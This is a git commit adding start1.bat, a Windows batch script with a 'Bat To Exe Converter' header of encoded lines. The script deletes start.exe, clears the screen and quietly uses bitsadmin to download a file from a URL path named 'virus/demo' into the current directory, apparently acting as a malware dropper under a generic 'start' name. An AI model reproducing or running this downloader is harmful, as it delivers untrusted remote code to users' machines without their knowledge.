5f025bfba54c2bf543ca5987688ff41eb8244985
nizhenets <can@nizhenets.com>
2024-05-27 20:12:19 +0300

    Create start1.bat

---
+++ start1.bat
@@ -0,0 +1,42 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDUNfAuVAE+1EbsQ5+n//NaOoUITR7pya4LWl7abIuIf71apLMBj33lV+A==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZksaHErUXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXsZg==
+::ZQ05rAF9IAHYFVzEqQIeIQFcSQqHKHja
+::eg0/rx1wNQPfEVWB+kM9LVsJDCqLJmO/CLAI+4g=
+::fBEirQZwNQPfEVWB+kM9LVsJDCqLJmO/CLAI+4g=
+::cRolqwZ3JBvQF1fEqQIeIQFcSQqHKHja
+::dhA7uBVwLU+EWHeN7ko1Jh5AX2Q=
+::YQ03rBFzNR3SWATE2ksqIB5aSRCRXA==
+::dhAmsQZ3MwfNWATE2ksqIB5aSRCRXA==
+::ZQ0/vhVqMQ3MEVWAtB9wBhJORAGMOX+pZg==
+::Zg8zqx1/OA3MEVWAtB9wBhJORAGMOX+pZg==
+::dhA7pRFwIByZRRmq/Vg4LRVRWBfi
+::Zh4grVQjdCyDJE2B51YMOw9VXhDTcm6iA9U=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+timeout /t 1 >nul
+cls
+del start.exe
+cls
+timeout /t 1 >nul
+cls
+bitsadmin.exe /transfer "İndirmeAdı" https://nizhenets.com/virus/demo/start.exe "%cd%\start.exe"
+cls
